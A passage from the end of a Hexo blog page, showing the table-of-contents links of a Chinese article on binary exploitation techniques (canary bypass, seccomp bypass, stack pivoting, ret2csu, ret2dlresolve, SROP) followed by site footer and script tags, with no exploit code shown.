__stack_chk_failed 函数报错信息泄露数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-canary-%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="nav-text">覆盖 canary 初始值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-prctl-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 prctl 创建 seccomp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-seccomp-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 seccomp 创建 seccomp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#orw"><span class="nav-text">orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%9F%E8%83%BD%E7%9B%B8%E4%BC%BC%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%9B%BF%E4%BB%A3"><span class="nav-text">使用功能相似的系统调用替代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-4-%E5%AD%97%E8%8A%82%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-text">使用 4 字节系统调用号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-32-%E4%BD%8D-shellcode-%E7%BB%95%E8%BF%87"><span class="nav-text">使用 32 位 shellcode 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-shellcode-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4-flag"><span class="nav-text">使用 shellcode 侧信道爆破
flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-close-%E7%BB%95%E8%BF%87-fd-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="nav-text">使用 close 绕过 fd 参数检查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%E6%AE%B5"><span class="nav-text">栈迁移到数据填充段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E5%AE%83%E7%A9%BA%E9%97%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">栈迁移到其它空闲地址</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-text">ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dlresolve"><span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="nav-text">相关结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dyn"><span class="nav-text">Dyn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sym"><span class="nav-text">Sym</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rel"><span class="nav-text">Rel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#link_map"><span class="nav-text">link_map</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dl_runtime_resolve-%E5%87%BD%E6%95%B0"><span class="nav-text">_dl_runtime_resolve 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-ret2dlresolve"><span class="nav-text">32 位 ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%86%99-.dynamic-%E7%9A%84-dt_strtab"><span class="nav-text">改写 .dynamic 的 DT_STRTAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E7%BA%B5%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E4%BD%BF%E5%85%B6%E6%8C%87%E5%90%91%E6%88%91%E4%BB%AC%E6%89%80%E6%9E%84%E9%80%A0%E7%9A%84-elf32_rel"><span class="nav-text">操纵第二个参数，使其指向我们所构造的
Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-ret2dlresolve-1"><span class="nav-text">64 位 ret2dlresolve</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#srop"><span class="nav-text">SROP</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        25 posts in total
                    </span>
                    
                        <span>
                            379.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>




    
<script src="/js/libs/mermaid.min.js"></script>

    
<script src="/js/plugins/mermaid.js"></script>






    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>